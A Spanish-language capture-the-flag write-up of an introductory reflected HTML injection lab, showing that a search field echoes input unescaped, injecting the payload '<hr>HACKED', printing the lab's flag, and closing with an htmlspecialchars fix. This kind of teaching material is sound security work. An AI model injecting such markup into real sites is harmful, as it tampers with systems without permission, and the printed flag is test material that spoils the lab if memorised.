# Búsqueda de Usuarios - Writeup

- **Plataforma:** SoftwareSeguro (Laboratorios de Ataque)
- **ID Desafío:** 6
- **Categoría:** XSS / HTML Injection
- **Dificultad:** Introductorio
- **Autor / Colaborador:** LucBere

---

## 1. Descripción del Desafío
El enunciado solicita lograr que el backend retorne un fragmento HTML que respete una línea horizontal y la palabra `HACKED` en mayúsculas a través de la funcionalidad de búsqueda de usuarios.

---

## 2. Reconocimiento e Identificación de la Vulnerabilidad
Al realizar una búsqueda de prueba (por ejemplo, `test1234`), se inspecciona el código fuente de la respuesta (`Ctrl + U` o `F12`):

```html
<div>
    <h5>Búsqueda: test1234</h5>
</div>
```

Se observa que el valor enviado en el parámetro de búsqueda se concatena de forma directa dentro de la etiqueta `<h5>` sin aplicar ningún tipo de filtro ni escape de entidades HTML (Reflected HTML Injection).

---

## 3. Explotación
Para cumplir con los dos requisitos del enunciado:
1. Generar una línea horizontal: etiqueta `<hr>`.
2. Mostrar la palabra: `HACKED`.

Se ingresa en la caja de búsqueda el siguiente payload:
```html
<hr>HACKED
```

El servidor renderiza:
```html
<div>
    <h5>Búsqueda: <hr>HACKED</h5>
</div>
```

El navegador interpreta la etiqueta `<hr>` dibujando la línea divisoria y refleja el texto `HACKED`, cumpliendo la condición de validación del laboratorio.

---

## 4. Flag / Código de Verificación
`a24fc443b7c617783d96417a4f9929dc`

---

## 5. Remediación Defensiva
Para mitigar esta vulnerabilidad se debe sanitizar cualquier entrada provista por el usuario antes de renderizarla en el DOM, aplicando codificación de entidades HTML (*HTML Entity Encoding*).

Ejemplo en PHP:
```php
echo "<h5>Búsqueda: " . htmlspecialchars($search_query, ENT_QUOTES, 'UTF-8') . "</h5>";
```
